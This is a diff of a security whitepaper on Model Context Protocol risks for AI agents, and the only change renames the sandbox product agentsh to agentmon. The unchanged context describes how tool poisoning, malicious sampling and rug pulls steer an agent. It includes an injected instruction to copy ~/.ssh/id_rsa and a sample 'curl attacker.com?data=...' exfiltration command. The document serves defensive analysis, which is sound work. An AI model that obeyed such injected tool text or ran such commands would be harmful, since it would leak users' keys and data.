@@ -22,12 +22,12 @@
   - [Defense Layer 3: Filesystem Isolation](#defense-layer-3-filesystem-isolation)
   - [Defense Layer 4: Credential Protection](#defense-layer-4-credential-protection)
   - [Defense Layer 5: LLM Proxy](#defense-layer-5-llm-proxy)
-- [Part 3: agentsh as MCP Server](#part-3-agentsh-as-mcp-server)
+- [Part 3: agentmon as MCP Server](#part-3-agentmon-as-mcp-server)
   - [Threat Model: Protecting Systems from Compromised Clients](#threat-model-protecting-systems-from-compromised-clients)
-  - [How agentsh MCP Server Mode Works](#how-agentsh-mcp-server-mode-works)
+  - [How agentmon MCP Server Mode Works](#how-agentmon-mcp-server-mode-works)
   - [Defense Layers in Server Mode](#defense-layers-in-server-mode)
-  - [Comparison: Raw MCP Server vs agentsh MCP Server](#comparison-raw-mcp-server-vs-agentsh-mcp-server)
-- [Part 4: What agentsh Cannot Protect Against](#part-4-what-agentsh-cannot-protect-against)
+  - [Comparison: Raw MCP Server vs agentmon MCP Server](#comparison-raw-mcp-server-vs-agentmon-mcp-server)
+- [Part 4: What agentmon Cannot Protect Against](#part-4-what-agentmon-cannot-protect-against)
   - [Architectural Limitations](#architectural-limitations)
   - [Mitigations for Gaps](#mitigations-for-gaps)
   - [The Honest Assessment](#the-honest-assessment)
@@ -48,9 +48,9 @@ Model Context Protocol (MCP) enables powerful AI agent capabilities by standardi
 This document examines:
 
 - **Eight critical MCP attack vectors** with technical details and real-world impact
-- **Two deployment scenarios**: protecting agents from malicious MCP servers, and protecting systems when agentsh acts as an MCP server
+- **Two deployment scenarios**: protecting agents from malicious MCP servers, and protecting systems when agentmon acts as an MCP server
 - **Defense-in-depth architecture** showing which layers protect against which attacks
-- **Honest limitations** of what agentsh can and cannot protect against
+- **Honest limitations** of what agentmon can and cannot protect against
 - **Practical guidance** for security teams, developers, and the broader security community
 
 The core insight: MCP security requires enforcement at multiple independent layers. Protocol-level attacks need protocol-level defenses. Action-level attacks need execution sandboxing. No single tool addresses the complete threat model—but understanding where each defense applies enables effective risk mitigation.
@@ -244,9 +244,9 @@ Malicious Sampling Flow:
 - Unauthorized tool execution
 - Data exfiltration through side channels
 
-#### agentsh Protection: ⚠️ Partial
+#### agentmon Protection: ⚠️ Partial
 
-agentsh provides partial protection:
+agentmon provides partial protection:
 
 | Protection | Coverage |
 |-----------|----------|
@@ -255,7 +255,7 @@ agentsh provides partial protection:
 | **Command Gating** | ✅ Covert tool invocations still hit policy checks |
 | **Conversation State** | ❌ No visibility into LLM context manipulation |
 
-**Limitation**: agentsh cannot prevent the injection itself—only limit the damage when injected instructions try to execute actions.
+**Limitation**: agentmon cannot prevent the injection itself—only limit the damage when injected instructions try to execute actions.
 
 ---
 
@@ -313,18 +313,18 @@ The injected instruction ("copy ~/.ssh/id_rsa") is invisible to users but proces
 - Persistent backdoors
 - Manipulation of all users connecting to the poisoned MCP server
 
-#### agentsh Protection: ❌ None (Protocol Layer)
+#### agentmon Protection: ❌ None (Protocol Layer)
 
-agentsh operates at the action layer, not the protocol layer:
+agentmon operates at the action layer, not the protocol layer:
 
 | Protection | Coverage |
 |-----------|----------|
-| **Tool Description Inspection** | ❌ agentsh doesn't see MCP protocol messages |
+| **Tool Description Inspection** | ❌ agentmon doesn't see MCP protocol messages |
 | **Command Execution** | ✅ Poisoned instructions still hit policy when executed |
 | **File Operations** | ✅ Unauthorized file access blocked by FUSE |
 | **Network Exfiltration** | ✅ Blocked by network rules |
 
-**Limitation**: agentsh cannot detect or prevent tool poisoning itself. However, when poisoned tools attempt malicious actions, those actions are subject to agentsh policy enforcement.
+**Limitation**: agentmon cannot detect or prevent tool poisoning itself. However, when poisoned tools attempt malicious actions, those actions are subject to agentmon policy enforcement.
 
 ---
 
@@ -369,16 +369,16 @@ Day 2: Server updates tool definition
 - No user awareness of changed behavior
 - Trust exploitation at scale
 
-#### agentsh Protection: ⚠️ Partial
+#### agentmon Protection: ⚠️ Partial
 
 | Protection | Coverage |
 |-----------|----------|
-| **Tool Definition Pinning** | ❌ agentsh doesn't track tool versions |
+| **Tool Definition Pinning** | ❌ agentmon doesn't track tool versions |
 | **Execution Policy** | ✅ New capabilities still subject to existing policies |
 | **Behavioral Analysis** | ❌ No baseline comparison of tool behavior |
 | **Action Auditing** | ✅ All actions logged for forensic analysis |
 
-**Limitation**: agentsh can't detect that a tool definition changed. However, policies based on what actions do (rather than what tools claim to do) remain effective.
+**Limitation**: agentmon can't detect that a tool definition changed. However, policies based on what actions do (rather than what tools claim to do) remain effective.
 
 ---
 
@@ -421,9 +421,9 @@ def run_grep(pattern: str, directory: str):
 - Lateral movement within networks
 - Complete server compromise
 
-#### agentsh Protection: ✅ Strong
+#### agentmon Protection: ✅ Strong
 
-This is agentsh's strongest protection layer:
+This is agentmon's strongest protection layer:
 
 | Protection | Coverage |
 |-----------|----------|
@@ -432,7 +432,7 @@ This is agentsh's strongest protection layer:
 | **Path Validation** | ✅ FUSE prevents traversal outside allowed directories |
 | **Network Control** | ✅ SSRF blocked by network allowlisting |
 
-**Why This Works**: Even if an MCP server has injection vulnerabilities, the injected commands execute within agentsh's sandbox. The shell shim intercepts the malicious command before it runs.
+**Why This Works**: Even if an MCP server has injection vulnerabilities, the injected commands execute within agentmon's sandbox. The shell shim intercepts the malicious command before it runs.
 
 ---
 
@@ -480,7 +480,7 @@ This is agentsh's strongest protection layer:
 - Data exfiltration through legitimate channels
 - Privilege escalation across trust boundaries
 
-#### agentsh Protection: ⚠️ Partial
+#### agentmon Protection: ⚠️ Partial
 
 | Protection | Coverage |
 |-----------|----------|
@@ -489,7 +489,7 @@ This is agentsh's strongest protection layer:
 | **Cross-Server Correlation** | ❌ No visibility into multi-server coordination |
 | **Data Flow Tracking** | ⚠️ File/network logs enable forensic analysis |
 
-**Limitation**: agentsh enforces policy per-action but doesn't understand multi-step attack patterns. A sufficiently complex orchestration where each individual step is policy-compliant may succeed.
+**Limitation**: agentmon enforces policy per-action but doesn't understand multi-step attack patterns. A sufficiently complex orchestration where each individual step is policy-compliant may succeed.
 
 ---
 
@@ -532,7 +532,7 @@ Legitimate Server:                    Malicious Server:
 - Query/command logging
 - Response manipulation
 
-#### agentsh Protection: ⚠️ Limited
+#### agentmon Protection: ⚠️ Limited
 
 | Protection | Coverage |
 |-----------|----------|
@@ -541,7 +541,7 @@ Legitimate Server:                    Malicious Server:
 | **Action Auditing** | ✅ Logs show which server provided the tool |
 | **Execution Policy** | ✅ Shadowed tool still subject to policy |
 
-**Limitation**: Tool shadowing is a client-side configuration issue. agentsh can limit server connectivity but can't control tool resolution order.
+**Limitation**: Tool shadowing is a client-side configuration issue. agentmon can limit server connectivity but can't control tool resolution order.
 
 ---
 
@@ -586,16 +586,16 @@ Legitimate Server:                    Malicious Server:
 - Persistent access (OAuth tokens often survive password changes)
 - Multi-user compromise from single server breach
 
-#### agentsh Protection: ❌ Out of Scope (Different Trust Boundary)
+#### agentmon Protection: ❌ Out of Scope (Different Trust Boundary)
 
 | Protection | Coverage |
 |-----------|----------|
-| **Server-Side Token Storage** | ❌ External to agentsh |
+| **Server-Side Token Storage** | ❌ External to agentmon |
 | **Agent Credential Isolation** | ✅ Agent can't access tokens it wasn't granted |
 | **Environment Filtering** | ✅ Limits credential exposure from agent side |
 | **Network Exfiltration** | ✅ Blocks unauthorized outbound connections |
 
-**Limitation**: MCP server security is outside agentsh's trust boundary. agentsh protects the agent; it cannot protect external MCP server infrastructure.
+**Limitation**: MCP server security is outside agentmon's trust boundary. agentmon protects the agent; it cannot protect external MCP server infrastructure.
 
 ---
 
@@ -634,7 +634,7 @@ Visible to User:                     Actual LLM Request:
 - Denial of service through quota exhaustion
 - Resource starvation affecting legitimate operations
 
-#### agentsh Protection: ✅ Strong
+#### agentmon Protection: ✅ Strong
 
 | Protection | Coverage |
 |-----------|----------|
@@ -652,7 +652,7 @@ Visible to User:                     Actual LLM Request:
 
 ### Threat Model: Agent as MCP Client
 
-In this scenario, an AI agent (running within agentsh) connects to external MCP servers to access tools and resources. The threat model assumes:
+In this scenario, an AI agent (running within agentmon) connects to external MCP servers to access tools and resources. The threat model assumes:
 
 - MCP servers may be compromised, malicious, or misconfigured
 - The agent is trusted but potentially manipulated via prompt injection
@@ -663,7 +663,7 @@ In this scenario, an AI agent (running within agentsh) connects to external MCP 
 │                    Agent as MCP Client                                   │
 │                                                                          │
 │   ┌─────────────────────────────────────────────────────────────────┐   │
-│   │                      agentsh Sandbox                             │   │
+│   │                      agentmon Sandbox                             │   │
 │   │                                                                  │   │
 │   │   ┌──────────────┐                                              │   │
 │   │   │    Agent     │                                              │   │
@@ -700,7 +700,7 @@ In this scenario, an AI agent (running within agentsh) connects to external MCP 
 **Implementation**:
 
 ```yaml
-# agentsh policy: Network allowlist for MCP servers
+# agentmon policy: Network allowlist for MCP servers
 network:
   rules:
     # Allow specific MCP server endpoints
@@ -743,7 +743,7 @@ network:
 **Implementation**:
 
 ```yaml
-# agentsh policy: Command execution rules
+# agentmon policy: Command execution rules
 commands:
   rules:
     # Block dangerous patterns regardless of source
@@ -788,7 +788,7 @@ commands:
 **Implementation**:
 
 ```yaml
-# agentsh policy: Filesystem access rules
+# agentmon policy: Filesystem access rules
 filesystem:
   rules:
     # Protect sensitive files
@@ -835,7 +835,7 @@ filesystem:
 **Implementation**:
 
 ```yaml
-# agentsh policy: Environment variable filtering
+# agentmon policy: Environment variable filtering
 environment:
   # Block known secret patterns
   deny_patterns:
@@ -879,7 +879,7 @@ environment:
 **Implementation**:
 
 ```yaml
-# agentsh config: LLM proxy settings
+# agentmon config: LLM proxy settings
 proxy:
   mode: embedded
 
@@ -913,11 +913,11 @@ dlp:
 
 ---
 
-## Part 3: agentsh as MCP Server
+## Part 3: agentmon as MCP Server
 
 ### Threat Model: Protecting Systems from Compromised Clients
 
-In this scenario, agentsh itself acts as an MCP server, providing sandboxed tools to MCP clients (Claude Desktop, IDEs, custom applications). The threat model assumes:
+In this scenario, agentmon itself acts as an MCP server, providing sandboxed tools to MCP clients (Claude Desktop, IDEs, custom applications). The threat model assumes:
 
 - MCP clients may be compromised via prompt injection
 - The client's LLM may attempt unauthorized actions
@@ -925,7 +925,7 @@ In this scenario, agentsh itself acts as an MCP server, providing sandboxed tool
 
 ```
 ┌─────────────────────────────────────────────────────────────────────────┐
-│                    agentsh as MCP Server                                 │
+│                    agentmon as MCP Server                                 │
 │                                                                          │
 │   ┌──────────────────┐                                                  │
 │   │    MCP Client    │                                                  │
@@ -938,7 +938,7 @@ In this scenario, agentsh itself acts as an MCP server, providing sandboxed tool
 │            │ (tool invocations)                                         │
 │            ▼                                                             │
 │   ┌─────────────────────────────────────────────────────────────────┐   │
-│   │                    agentsh MCP Server                            │   │
+│   │                    agentmon MCP Server                            │   │
 │   │                                                                  │   │
 │   │   ┌──────────────┐    ┌──────────────┐    ┌──────────────┐     │   │
 │   │   │ Tool Handler │───►│ Policy Stack │───►│  Sandboxed   │     │   │
@@ -960,26 +960,26 @@ In this scenario, agentsh itself acts as an MCP server, providing sandboxed tool
 
 ---
 
-### How agentsh MCP Server Mode Works
+### How agentmon MCP Server Mode Works
 
-agentsh can run as an MCP server, exposing sandboxed tools to MCP clients:
+agentmon can run as an MCP server, exposing sandboxed tools to MCP clients:
 
 ```json
 {
   "mcpServers": {
-    "agentsh": {
-      "command": "agentsh",
+    "agentmon": {
+      "command": "agentmon",
       "args": ["mcp-server"],
       "env": {
-        "AGENTSH_WORKSPACE": "/home/user/project",
-        "AGENTSH_POLICY": "default"
+        "AGENTMON_WORKSPACE": "/home/user/project",
+        "AGENTMON_POLICY": "default"
       }
     }
   }
 }
 ```
 
-**Tool Mapping**: agentsh exposes tools like `exec`, `read_file`, `write_file`, `list_directory`. Each tool invocation goes through the full policy stack.
+**Tool Mapping**: agentmon exposes tools like `exec`, `read_file`, `write_file`, `list_directory`. Each tool invocation goes through the full policy stack.
 
 **Structured Responses**: All tool outputs include structured metadata (bytes read/written, paths accessed, policy decisions) enabling client-side monitoring.
 
@@ -987,7 +987,7 @@ agentsh can run as an MCP server, exposing sandboxed tools to MCP clients:
 
 ### Defense Layers in Server Mode
 
-When agentsh is the MCP server, the same defense layers apply—but from a different perspective:
+When agentmon is the MCP server, the same defense layers apply—but from a different perspective:
 
 | Layer | Client Mode Protection | Server Mode Protection |
 |-------|----------------------|----------------------|
@@ -999,9 +999,9 @@ When agentsh is the MCP server, the same defense layers apply—but from a diffe
 
 ---
 
-### Comparison: Raw MCP Server vs agentsh MCP Server
+### Comparison: Raw MCP Server vs agentmon MCP Server
 
-| Security Property | Raw MCP Server | agentsh MCP Server |
+| Security Property | Raw MCP Server | agentmon MCP Server |
 |-------------------|---------------|-------------------|
 | **Command Injection Protection** | ❌ Implementation-dependent | ✅ Shell shim catches all |
 | **File Access Control** | ❌ Usually full access | ✅ Per-file, per-operation policy |
@@ -1013,18 +1013,18 @@ When agentsh is the MCP server, the same defense layers apply—but from a diffe
 
 ---
 
-## Part 4: What agentsh Cannot Protect Against
+## Part 4: What agentmon Cannot Protect Against
 
 ### Architectural Limitations
 
-These limitations stem from where agentsh operates in the stack. Understanding them is essential for building complete MCP security.
+These limitations stem from where agentmon operates in the stack. Understanding them is essential for building complete MCP security.
 
 #### 1. MCP Protocol-Level Attacks (Before Execution)
 
-**Tool Poisoning Detection**: agentsh doesn't see tool descriptions or metadata.
+**Tool Poisoning Detection**: agentmon doesn't see tool descriptions or metadata.
 
 ```
-MCP Protocol Layer:          ←── agentsh has NO visibility here
+MCP Protocol Layer:          ←── agentmon has NO visibility here
 ┌────────────────────────────────────────────────┐
 │ Tool: "safe_tool"                              │
 │ Description: "Does safe things.                │
@@ -1032,7 +1032,7 @@ MCP Protocol Layer:          ←── agentsh has NO visibility here
 └────────────────────────────────────────────────┘
                     │
                     ▼
-Execution Layer:             ←── agentsh enforces here
+Execution Layer:             ←── agentmon enforces here
 ┌────────────────────────────────────────────────┐
 │ Command: curl attacker.com?data=...            │
 │ Policy: BLOCKED (network allowlist)            │
@@ -1041,7 +1041,7 @@ Execution Layer:             ←── agentsh enforces here
 
 **Status**: ❌ Cannot address without MCP protocol integration
 
-**Why**: agentsh intercepts *actions*, not *instructions to the LLM*. A poisoned tool description influences the LLM before any command runs.
+**Why**: agentmon intercepts *actions*, not *instructions to the LLM*. A poisoned tool description influences the LLM before any command runs.
 
 ---
 
@@ -1049,11 +1049,11 @@ Execution Layer:             ←── agentsh enforces here
 
 **Conversation Hijacking**: Injected instructions persist in LLM context.
 
-agentsh has no visibility into what the LLM "remembers" or what instructions are active in its context window. A malicious sampling request can poison an entire session without triggering any policy checks.
+agentmon has no visibility into what the LLM "remembers" or what instructions are active in its context window. A malicious sampling request can poison an entire session without triggering any policy checks.
 
 **Status**: ❌ Fundamental limitation—would require LLM integration
 
-**Why**: The conversation state exists within the LLM, not within the execution environment. agentsh sees commands, not the reasoning that led to them.
+**Why**: The conversation state exists within the LLM, not within the execution environment. agentmon sees commands, not the reasoning that led to them.
 
 ---
 
@@ -1061,23 +1061,23 @@ agentsh has no visibility into what the LLM "remembers" or what instructions are
 
 **Post-Approval Changes**: Tool definitions are fetched dynamically.
 
-agentsh doesn't track tool definition versions. A tool approved yesterday may behave differently today, and agentsh won't know the definition changed.
+agentmon doesn't track tool definition versions. A tool approved yesterday may behave differently today, and agentmon won't know the definition changed.
 
 **Status**: ⚠️ Partial protection
 
-**Why Partial**: While agentsh can't detect definition changes, policies based on *what actions do* (rather than *what tools claim to do*) remain effective. A tool that starts making unauthorized network connections will still be blocked.
+**Why Partial**: While agentmon can't detect definition changes, policies based on *what actions do* (rather than *what tools claim to do*) remain effective. A tool that starts making unauthorized network connections will still be blocked.
 
 ---
 
 #### 4. Token/Credential Theft from MCP Servers
 
-**External Server Compromise**: agentsh protects the agent, not remote servers.
+**External Server Compromise**: agentmon protects the agent, not remote servers.
 
-If an MCP server stores OAuth tokens insecurely and gets breached, that's outside agentsh's scope. We protect the agent's side of the trust boundary.
+If an MCP server stores OAuth tokens insecurely and gets breached, that's outside agentmon's scope. We protect the agent's side of the trust boundary.
 
 **Status**: ❌ Out of scope—different trust boundary
 
-**Why**: MCP server security is the server operator's responsibility. agentsh provides agent-side protection.
+**Why**: MCP server security is the server operator's responsibility. agentmon provides agent-side protection.
 
 ---
 
@@ -1099,7 +1099,7 @@ The LLM proxy tracks usage, but sampling requests may bypass the proxy if the MC
 |-----|----------------------|------------|-------|
 | **Tool poisoning** | MCP-aware proxy that inspects tool definitions | High | Requires MCP protocol parsing and heuristic detection |
 | **Conversation hijacking** | Integration with LLM provider safety features | High | External dependency on provider capabilities |
-| **Rug pulls** | Tool definition pinning/hashing in agentsh MCP mode | Medium | Possible spec extension for agentsh-as-server |
+| **Rug pulls** | Tool definition pinning/hashing in agentmon MCP mode | Medium | Possible spec extension for agentmon-as-server |
 | **Sampling resource theft** | Force all LLM calls through embedded proxy | Medium | Network policy configuration |
 | **Cross-server correlation** | Multi-action pattern detection | High | Requires behavioral analysis across sessions |
 
@@ -1107,7 +1107,7 @@ The LLM proxy tracks usage, but sampling requests may bypass the proxy if the MC
 
 ### The Honest Assessment
 
-#### Where agentsh Excels
+#### Where agentmon Excels
 
 | Capability | Strength | Why |
 |-----------|----------|-----|
@@ -1118,7 +1118,7 @@ The LLM proxy tracks usage, but sampling requests may bypass the proxy if the MC
 | **Audit Trail** | ✅ Strong | Structured JSON logs with full context |
 | **Resource Limits** | ✅ Strong | Cgroups provide kernel-enforced boundaries |
 
-#### Where agentsh Provides Partial Protection
+#### Where agentmon Provides Partial Protection
 
 | Capability | Limitation | Why Partial |
 |-----------|-----------|-------------|
@@ -1126,11 +1126,11 @@ The LLM proxy tracks usage, but sampling requests may bypass the proxy if the MC
 | **Cross-Server Attacks** | ⚠️ No coordination detection | Each action checked independently |
 | **Rug Pulls** | ⚠️ No definition tracking | Actions still policy-checked |
 
-#### Where agentsh Has No Coverage
+#### Where agentmon Has No Coverage
 
 | Capability | Limitation | Why |
 |-----------|-----------|-----|
-| **Protocol-Level Manipulation** | ❌ | Tool descriptions, metadata invisible to agentsh |
+| **Protocol-Level Manipulation** | ❌ | Tool descriptions, metadata invisible to agentmon |
 | **LLM Conversation State** | ❌ | Context poisoning happens inside the LLM |
 | **External MCP Server Security** | ❌ | Different trust boundary |
 
@@ -1145,7 +1145,7 @@ The gaps above demonstrate why **defense-in-depth is essential**. No single tool
 │                    Complete MCP Security Stack                           │
 │                                                                          │
 │   ┌─────────────────────────────────────────────────────────────────┐   │
-│   │  Protocol Layer (NOT agentsh)                                    │   │
+│   │  Protocol Layer (NOT agentmon)                                    │   │
 │   │  - MCP client hardening                                         │   │
 │   │  - Tool definition vetting/signing                              │   │
 │   │  - Server reputation systems                                    │   │
@@ -1153,7 +1153,7 @@ The gaps above demonstrate why **defense-in-depth is essential**. No single tool
 │                                    │                                     │
 │                                    ▼                                     │
 │   ┌─────────────────────────────────────────────────────────────────┐   │
-│   │  Conversation Layer (NOT agentsh)                                │   │
+│   │  Conversation Layer (NOT agentmon)                                │   │
 │   │  - LLM provider safety features                                 │   │
 │   │  - Prompt filtering/validation                                  │   │
 │   │  - Context isolation                                            │   │
@@ -1161,7 +1161,7 @@ The gaps above demonstrate why **defense-in-depth is essential**. No single tool
 │                                    │                                     │
 │                                    ▼                                     │
 │   ┌─────────────────────────────────────────────────────────────────┐   │
-│   │  Action Layer (agentsh)                                  ✅     │   │
+│   │  Action Layer (agentmon)                                  ✅     │   │
 │   │  - Command execution gating                                     │   │
 │   │  - Filesystem isolation                                         │   │
 │   │  - Credential protection                                        │   │
@@ -1170,7 +1170,7 @@ The gaps above demonstrate why **defense-in-depth is essential**. No single tool
 │                                    │                                     │
 │                                    ▼                                     │
 │   ┌─────────────────────────────────────────────────────────────────┐   │
-│   │  Network Layer (agentsh)                                 ✅     │   │
+│   │  Network Layer (agentmon)                                 ✅     │   │
 │   │  - Connection allowlisting                                      │   │
 │   │  - eBPF enforcement                                             │   │
 │   │  - DLP on LLM calls                                             │   │
@@ -1179,7 +1179,7 @@ The gaps above demonstrate why **defense-in-depth is essential**. No single tool
 └─────────────────────────────────────────────────────────────────────────┘
 ```
 
-**agentsh provides strong action-layer and network-layer enforcement.** It catches attacks that bypass protocol-level defenses and contains damage when MCP servers or clients are compromised. It complements—but doesn't replace—security at other layers.
+**agentmon provides strong action-layer and network-layer enforcement.** It catches attacks that bypass protocol-level defenses and contains damage when MCP servers or clients are compromised. It complements—but doesn't replace—security at other layers.
 
 ---
 
@@ -1208,7 +1208,7 @@ Before deploying AI agents with MCP access, evaluate:
 | **Low** | Read-only tools, public data | Logging, basic network allowlist |
 | **Medium** | Write access, internal data | + Filesystem policies, command filtering |
 | **High** | Credentials, external APIs | + Human approval, sandboxed execution |
-| **Critical** | Production systems | + Full agentsh stack, audit trails, incident response plan |
+| **Critical** | Production systems | + Full agentmon stack, audit trails, incident response plan |
 
 #### Minimum Viable MCP Security
 
@@ -1222,12 +1222,12 @@ Before deploying AI agents with MCP access, evaluate:
 
 ### For Developers Deploying Agents with MCP
 
-#### Quick Start: Securing MCP with agentsh
+#### Quick Start: Securing MCP with agentmon
 
 **1. Basic Configuration**
 
 ```yaml
-# ~/.agentsh/config.yaml
+# ~/.agentmon/config.yaml
 network:
   rules:
     # Allow your MCP servers
@@ -1273,38 +1273,38 @@ filesystem:
       path: "**/secrets/*"
 ```
 
-**2. Running with agentsh**
+**2. Running with agentmon**
 
 ```bash
 # Start a session with your agent
-agentsh session create --workspace /path/to/project
+agentmon session create --workspace /path/to/project
 
 # Run your agent within the session
-agentsh exec <session-id> -- your-agent-command
+agentmon exec <session-id> -- your-agent-command
 ```
 
 **3. Monitoring**
 
 ```bash
 # View session activity
-agentsh session logs <session-id>
+agentmon session logs <session-id>
 
 # Generate security report
-agentsh report <session-id> --level=detailed
+agentmon report <session-id> --level=detailed
 ```
 
 #### Integration Patterns
 
 **With Claude Code**:
 ```bash
-# agentsh wraps the Claude session
-agentsh session create --workspace ~/project
-agentsh exec <session-id> -- claude
+# agentmon wraps the Claude session
+agentmon session create --workspace ~/project
+agentmon exec <session-id> -- claude
 ```
 
 **With Custom Agents**:
 ```python
-# Agent runs within agentsh session
+# Agent runs within agentmon session
 # All subprocess calls go through shell shim
 import subprocess
 subprocess.run(["ls", "-la"])  # Policy-checked
@@ -1315,11 +1315,11 @@ subprocess.run(["ls", "-la"])  # Policy-checked
 {
   "mcpServers": {
     "secure-workspace": {
-      "command": "agentsh",
+      "command": "agentmon",
       "args": ["mcp-server"],
       "env": {
-        "AGENTSH_WORKSPACE": "/home/user/project",
-        "AGENTSH_POLICY": "restrictive"
+        "AGENTMON_WORKSPACE": "/home/user/project",
+        "AGENTMON_POLICY": "restrictive"
       }
     }
   }
@@ -1353,7 +1353,7 @@ MCP security requires coordinated defenses across multiple layers:
 │                                ▼                                          │
 │           ┌────────────────────────────────────────────┐                 │
 │           │            Execution Sandbox                │                 │
-│           │               (agentsh)                     │                 │
+│           │               (agentmon)                     │                 │
 │           │                                             │                 │
 │           │  • Command interception                     │                 │
 │           │  • Filesystem isolation                     │                 │
@@ -1370,7 +1370,7 @@ MCP security requires coordinated defenses across multiple layers:
 
 1. **Protocol vs. Action Security**: MCP protocol-level attacks (tool poisoning, rug pulls) require protocol-level defenses. Execution-level attacks (command injection, file access) require execution-level defenses. Neither substitutes for the other.
 
-2. **Trust Boundary Clarity**: Clearly define which components trust which others. agentsh protects the agent execution environment—not external MCP servers, not the LLM's conversation state.
+2. **Trust Boundary Clarity**: Clearly define which components trust which others. agentmon protects the agent execution environment—not external MCP servers, not the LLM's conversation state.
 
 3. **Defense Independence**: Each defense layer should work independently. If the network layer fails, filesystem isolation should still protect. If both fail, audit logs should still capture what happened.
 
@@ -1406,18 +1406,18 @@ Effective MCP security requires enforcement at multiple independent layers:
 |-------|---------------|-------|
 | **Protocol** | Tool definition integrity, server authentication | MCP client hardening, signing |
 | **Conversation** | Prompt safety, context isolation | LLM provider features, prompt filters |
-| **Action** | Execution control, filesystem/network isolation | agentsh |
+| **Action** | Execution control, filesystem/network isolation | agentmon |
 | **Audit** | Visibility, forensics, compliance | Structured logging, SIEM integration |
 
-### Where agentsh Fits
+### Where agentmon Fits
 
-agentsh provides strong **action-layer** and **network-layer** enforcement:
+agentmon provides strong **action-layer** and **network-layer** enforcement:
 
 - **Catches attacks that bypass protocol defenses**: Even if a poisoned tool manipulates the LLM, the resulting malicious commands are blocked.
-- **Contains damage from compromised components**: If an MCP server or client is compromised, agentsh limits what attackers can do.
+- **Contains damage from compromised components**: If an MCP server or client is compromised, agentmon limits what attackers can do.
 - **Provides forensic visibility**: Structured logs capture exactly what happened for incident response.
 
-agentsh **complements but doesn't replace** security at other layers. Protocol-level attacks need protocol-level defenses.
+agentmon **complements but doesn't replace** security at other layers. Protocol-level attacks need protocol-level defenses.
 
 ### The Bottom Line
 
@@ -1428,7 +1428,7 @@ For organizations deploying AI agents with MCP access to sensitive systems:
 3. **Assume breach**: Design for the scenario where an MCP server or the agent itself is compromised.
 4. **Execution sandboxing is not optional**: The final defense against any attack is controlling what actually executes.
 
-Whether an attack comes through prompt injection, tool poisoning, or server compromise, the last line of defense is controlling what happens at the execution layer. That's where agentsh operates.
+Whether an attack comes through prompt injection, tool poisoning, or server compromise, the last line of defense is controlling what happens at the execution layer. That's where agentmon operates.
 
 ---
 
